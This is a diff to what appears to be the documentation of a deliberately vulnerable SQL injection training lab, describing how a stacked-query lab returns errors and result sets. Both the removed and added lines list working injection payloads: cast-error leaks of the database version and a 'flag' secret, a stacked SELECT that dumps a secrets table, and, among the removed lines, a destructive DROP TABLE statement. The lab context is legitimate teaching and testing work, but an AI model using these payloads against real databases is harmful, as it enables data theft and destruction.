@@ -71,13 +71,27 @@ All three fields are vulnerable in both labs.
   ```
 
 ### Lab 2 — Stacked-query payloads
-- Server version (`comment`): `'); SELECT version() --`
-- Read the secrets table (`comment`): `'); SELECT name, value FROM secrets --`
-- Run a destructive statement (any field): `'); DROP TABLE secrets --` (don't do this on data you care about).
+The server splits the constructed SQL on `;` and runs each statement
+separately. Errors from the original INSERT (statement 0) are
+collapsed to a generic `ERROR: syntax error` /
+`ERROR: unterminated quoted string` — **error-based payloads inside
+the INSERT body do not leak in Lab 2.** Errors from stacked statements
+are returned verbatim.
 
-In Lab 2 the response body contains a `resultSets` array with one
-entry per executed statement; the leaked rows show up there directly
-without needing an error message.
+- Stacked cast-error leak (any field): `'); SELECT CAST(version() AS int) --`
+  → response `error`: `invalid input syntax for type integer: "PostgreSQL 16..."`.
+- Stacked secrets cast-error leak (any field):
+  `'); SELECT CAST((SELECT value FROM secrets WHERE name='flag') AS int) --`
+- Stacked SELECT (no error needed): `'); SELECT name, value FROM secrets --`
+  → leaked rows appear in `resultSets[1].rows`.
+- In-INSERT cast (try this and observe it gets sanitized):
+  `') , ('x','y',(SELECT CAST(version() AS int))) --`
+  → response `error`: `ERROR: syntax error` (or `unterminated quoted string`),
+  no leak.
+
+The response body contains a `resultSets` array with one entry per
+successfully executed statement, plus a `statementIndex` on errors so
+you can tell which statement triggered the error.
 
 ## Files
 
